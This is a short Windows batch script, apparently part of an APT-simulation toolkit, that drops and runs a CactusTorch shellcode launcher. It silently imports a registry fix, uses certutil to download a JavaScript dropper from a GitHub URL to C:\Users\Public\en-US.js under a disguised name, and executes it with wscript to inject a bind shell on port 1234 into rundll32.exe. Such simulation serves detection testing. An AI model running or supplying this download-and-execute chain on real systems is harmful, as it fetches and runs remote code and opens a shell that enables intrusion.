@ECHO OFF

ECHO ===========================================================================
ECHO CACTUSTORCH
ECHO Using certutil to drop a CactusTorch shellcode lanucher injecting bind shell (port 1234/tcp) into rundll32.exe
ECHO Fixing possible problems with JavaScript on the system
ping -n 5 127.0.0.1 > NUL "%ZIP%" e -p%PASS% "%FILEARCH%" -aoa -o"%TEMP%" workfiles\jsfix.reg > NUL regedit.exe /s "%TEMP%\jsfix.reg"

ECHO Downloading the CactusTorch dropper (press Enter if it takes more than 20s)
cmd.exe /c certutil.exe -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js

ECHO Executing the CactusTorch dropper
if exist C:\Users\Public\en-US.js (
  start /B cmd /c wscript.exe C:\Users\Public\en-US.js
)
